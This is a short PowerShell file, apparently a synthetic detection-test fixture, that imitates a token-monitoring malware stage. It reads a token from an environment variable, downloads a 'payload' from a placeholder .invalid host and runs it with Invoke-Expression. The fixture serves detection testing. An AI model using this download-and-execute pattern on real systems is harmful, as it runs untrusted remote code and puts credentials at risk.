# FIXTURE ONLY - synthetic detection test sample, not real malware.
# A "hostage token" monitor downloads its next-stage handler and runs it with Invoke-Expression
# through a variable (tensorlake / Shai-Hulud, Socket 2026-10-08). The endpoint is .invalid.
$token = $env:GH_FIXTURE_TOKEN
$handler = Invoke-RestMethod -Uri "https://handler.deadman-fixture.invalid/payload"
Invoke-Expression $handler
